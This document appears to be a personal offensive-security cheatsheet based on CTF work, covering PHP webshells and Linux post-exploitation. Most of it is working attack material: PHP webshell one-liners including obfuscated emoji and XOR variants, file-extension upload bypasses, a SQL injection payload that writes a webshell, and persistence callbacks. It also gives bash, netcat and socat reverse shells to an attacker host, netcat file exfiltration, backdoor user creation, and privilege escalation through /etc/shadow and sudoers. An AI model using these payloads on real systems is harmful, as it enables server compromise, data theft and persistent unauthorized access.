# Webshell
*  [Webshell cheatsheet](#webshell-cheatsheet)  
*  [Bypass blacklist extension](#bypass-blacklist-extension)  
*  [SQL inj to webshell](#sql-inj-to-webshell)  
*  [Don't delete my webshell](#dont-delete-my-webshell)  
*  [Reverse shell](#reverse-shell)  
*  [weevely shell](#weevely-shell)  
*  [Privilege escalation](#privilege-escalation)  
*  [Reference](#reference)

# Webshell cheatsheet
```php
<?php system('ls'); ?>
<?php system(ls); ?>
<?php system($_GET['cmd']); ?>
<?php system($_GET[1]); ?>

<?php passthru('ls'); ?>


// blind
<?php shell_exec('echo 1>1'); ?>        // 1=echo 1>1
<?php shell_exec('>1');    ?>        // 1=>1

<?php shell_exec('wget -O 1.php url');   ?> // download shell
<?php shell_exec('curl -o 1.php url');  ?>  // default to download index.html

<?=`$_GET[1]`;          ?>         // <?= is used to shorten the <?php echo `blah`;
// `` won't show the result just as exec, so we also need echo
echo `$_GET[1]`;&1=ls

echo "{${phpinfo()}}";
echo "{${system("ls")}}";
die("...");


// local file inclusion
include$_GET[1];             // the space between the them can be ignored
include /var/lib/php/sessions/sess_xxxxx  // when the content of session is controllable

// write the shell encoded with base64, then decode
$_GET[1](file,chracter,8);&1=file_put_contents .....
include$_GET[0];&0=php://filter/read=convert.base64-decode/resource=file


// PHP code execution
<?php eval('echo `ls`;');    ?>   // the code inside of eval need to end with ;
<?php assert('phpinfo();');   ?> // the code inside of assert don't need to end with ;

<?php preg_replace("/\[(.*)]/e",'\\1',$_GET['str']);  ?> // ？str=[phpinfo()]
// execute only when match
// from PHP 5.5, it will cause to error of E_DEPRECATED
// after PHP 7.0.0, we need to use preg_replace_callback() to replace it


// extended array and callback function, the feature of PHP after 5.4  
?1[]=blah&1[]=system();&2=assert     
param=usort(...$_GET);


// if you can write file e.g. tmp php file
// you can use characters like ".", or "source" to execute the file
// . /file will also not print out the result
```
👾How to bypass the length limit：  
* Build command with filename, then `ls` all thing into shell script [HITCON CTF](http://taiwan.1pwnch.com/web/ctf/2018/02/20/A-tiny-shell/#more)

[system v.s. exec v.s. shell_exec](https://blog.longwin.com.tw/2013/06/php-system-exec-shell_exec-diff-2013/)  
**exec() and shell_exec() all need echo**  
[Awesome analysis of php lib exp](https://stackoverflow.com/questions/3115559/exploitable-php-functions)  
  
👾Emoji shell:  
```php
// Use dot. to concat
$😭 = $😙. $😀. $🤗. $🤗. $🤩. $😆. $🙂. $🤔;

// XOR
$😊 = "||||%-" ^ "/%/(``";
$😊 ("`|" ^ ",/");
```
From VXCTF2018, I used such shell without English, number, and underline, content is `<?=SYSTEM(LS);`.  
```php
<?=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);
```  
From `Meepwn Quals 2018`, I use such shell without text, you can also replace the underline with emoji...  
[VXCTF2018](https://github.com/shinmao/CTF-writeups/tree/master/vxcon2018)  


👾Here comes another advanced problem:  
```php
preg_match("/[A-Za-z0-9_$]+/",$a)
eval($a);
```  
I cannot use `$` to create variable anymore, how should I do?  
In php7.0, there is a new way to run function dynamically such as `('phpinfo')();`, with this way we shorten the length of string. For the limitation on alphanumeric character, we can use **NOT** operator to transform it: `(~%8F%97%8F%96%91%99%90)();`.   
In addition to new way in php7.0, **using glob** can also help us a lot. `[x]` is also the member of Linux glob and we can use it just like regex to target specific file just like following:  
```php
ls /??/??[^_][A-Z]
```  
This means list the file the last two words of whose are not `_` and in range of A to Z. Awesome!!

# Bypass blacklist extension  
[服务器针对文件的解析漏洞汇总](https://mp.weixin.qq.com/s/f0y_AjRtc4NjEqeJe6cPhw)  
In addition to `.php`，with regex in conf:  
* `.php3`  
* `.php4`  
* `.php5`  
* `.php7`  
* `.pht`  
* `.phtml`  
can also be parsed as php file  
* `.php.xxx`  
In old version  
apache2 parse from the right side to left side, until it recognize the extension  
* `.php/.`
What's worth mention: this trick cannot be used to overwrite old file  
php would recursively remove the part of `/.`.  
[Apache2 php5 conf](https://github.com/shinmao/Web-Security-Learning/blob/master/Webshell/apache2_php5.conf)  
* `move_uploaded_file()`  
With use of lstat() in this function, we can bypass the above overwrite limitation on `/.`  
[My own notes](https://shinmao.github.io/web/2018/04/13/The-Magic-from-0CTF-ezDoor/)

# SQL inj to webshell
MYSQL:  
```
select into outfile(dumpfile)  // mysql write to document
```  
E.G.  
```  
union select 1,2,"<? system($_GET['fuck']) ?>" into outfile "://path"
```

# Dont delete my webshell
```php
<?php
$e = $_REQUEST['e'];
register_shutdown_function($e, $_REQUEST['pass']);
// callback after shutdown
// ?e=assert&pass=phpinfo();

<?php
$e = $_REQUEST['e'];
declare(ticks=1);
register_tick_function ($e, $_REQUEST['pass']);
?>
```  
[@lem0n Bypass_Disable_functions_Shell](https://github.com/l3m0n/Bypass_Disable_functions_Shell)  

# Reverse shell
If the target is located in the intranet, I cannot connect to it from the outside then Reverse shell is your best choice. Reverse shell means the victim activate the connection to the attacker.  
1. bash  
```php
bash -i >& /dev/tcp/attacker_ip/8080 0>&1
```  
Here we need to redirect all the fd 0,1,2 to `/dev/tcp/attacker_ip/port` instead of showing on the victim machine.  
[ref: Linux反弹shell（一）文件描述符与重定向](https://xz.aliyun.com/t/2548)  
[ref: Linux 反弹shell（二）反弹shell的本质](https://xz.aliyun.com/t/2549)  

2. netcat  
```php
nc -lvvp 8080   // listen to the 8080 port
nc attacker_ip 8080 -t -e /bin/bash
```
build up a connection then execute `/bin/bash`  
Here, I also introduce the way to dump the remote file with netcat:  
```php
// receive side
nc -lvvp 8080 > file.tar.gz   // listen and save the compressed file as file.tar.gz

// sender side
tar -czvf file.tar.gz path/to/file [path/to/file2 path/to/file3 ...]
cat file.tar.gz | nc receive_ip listen_port
```  
Then, you can use `tar -xzvf file.tar.gz` to extract the archive on the receive side.  

3. socat  
```php
socat tcp-listen:8080 -
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker_ip:8080
```  

4. python, php, java, perl  
http://www.03sec.com/3140.shtml  

5. msfvenom can generate the payload  
```php
msfvenom -l payloads cmd/unix/reverse
// this can list all the reverse script
msfvenom -p cmd/unix/xxxx lhost=target_ip lport=target_port R
```  

Try your best not to upload any tools to the server because it would be complicated to clean your footprint after all. Therefore, we choose the **natural** library to build up the shell much more...  

If you want a shell which is more interactive...  
1. add user  
```php
useradd new;echo 'new:password'|chpasswd
useradd new;echo -e 'xxxxxxx' |passwd test
```  
2. Get std shell with python  
```php
python -c "import pty;pty.spawn('/bin/bash')"
```  

reference from [安全客](https://www.anquanke.com/post/id/87017)  
reference from [你和目标只差一个shell的距离](https://klionsec.github.io/2016/09/27/revese-shell/)  

# weevely shell
We can use weevely shell in kali system. Its advantage is difficulty for others to get its private key, and its disadvantage is slow because it need to run on php.  
```php
// in kali
weevely generate password shell.php

// after you upload your shell.php
// connect
weevely http://example.com/shell.php password
```  
Additionally, you can many modules on it.  
[Reference to epinna/weevely3](https://github.com/epinna/weevely3)  

# Privilege escalation    
1. escalate with kernel exploit  
```php
uname -a // you can get the version of kernel and information
e.g. Linux shinmao 4.17.0-kali1-amd64 #1 SMP Debian 4.17.8-1kali1 (2018-07-24) x86_64 GNU/Linux
```  
search exploit in kali  
```php
searchsploit linux priv esc 4.17.0 kali
```  
We still need to compile it to run it on the victim machine!! However, in the real world we might run into the condition such that `gcc` isn't installed on the server. In addition, **reading source code** before you compile it is the most important thing!  

2. `/etc/shadow` of Plain text  
`/etc/passwd` stores the system user, `/etc/shadow` stores the hash of password  
```php
root:x:0:0:root:/root:/bin/bash // first column means user name, second column x means hash is in shadow

root:$6$oTOxM5L9$.riBRt1HVnB5VDzDY/6FJLpMdN7pJRYDBeJGxRM1dklS/fY4if54eOK8GyFiyjS2bhuvA.CXNpGnlLs6RRXi1.:17760:0:99999:7:::
```  
However, in the real world we would run into the issue such as permission. If `/etc/passwd` is writeable, we can overwrite the `x` with the hash we already know. Or if `/etc/shadow` is readable, we can give the hash to john or hashcat.  

3. `/etc/sudoers` is writeable  
The document can define who is able to run `sudo`.  
```php
# User privilege specification
root	ALL=(ALL:ALL) ALL
1pwnch ALL=(ALL:ALL) ALL  
```  
Now you can use `sudo /bin/bash` to escalate your privilege.  

4. [利用crontab提權](https://www.anquanke.com/post/id/148564#h2-2)  
```php
ls -l /etc/cron*
```  

5. [通过可写文件获取Root权限的多种方式](http://www.freebuf.com/articles/system/175086.html)  
   Run the root's script which has SUID can also help escalate to root...  

Therefore, we need to find the vulnerability efficiently. You can find some script to brute check, or you can check manually here [basic linux privilege escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation).  

### Reference  
* [千变万化的WebShell-Seebug](https://paper.seebug.org/36/)
* [七字短shell](http://wonderkun.cc/index.html/?p=524%EF%BC%88%E9%80%9A%E8%BF%87)  
* [PHP MANUAL Assert](http://php.net/manual/en/function.assert.php)  
* [PHP MANUAL Usort](http://php.net/manual/en/function.usort.php)  
* [PHP MANUAL 延長數組](http://php.net/manual/zh/migration56.new-features.php)
* [P師傅木馬免殺](https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html)  
* [stackoverflow Exploitable PHP functions](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
* [Ali0thNotes PHP代码审计归纳](https://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md)  
* [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation)
